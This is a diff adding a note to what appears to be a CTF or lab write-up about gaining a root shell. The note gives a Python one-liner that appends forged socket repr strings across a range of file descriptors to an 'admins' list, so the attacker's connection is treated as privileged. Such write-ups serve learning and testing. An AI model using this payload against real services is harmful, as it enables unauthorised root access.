@@ -86,3 +86,11 @@ shell
 # whoami
 root
 ```
+
+Note: the file descriptor our os would assign to the socket opened by ncat could change than what we appended to admins list in nc session and you will get normal shell in that case so it's better to first get the value of `socket_client` string then copy and loop through to append like `1-100` fds so it would match eitherway. something like 
+
+i.e.
+
+```python
+[admins.append("<socket.socket fd=" + str(i) + ", family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>") for i in range(3, 15)]
+```
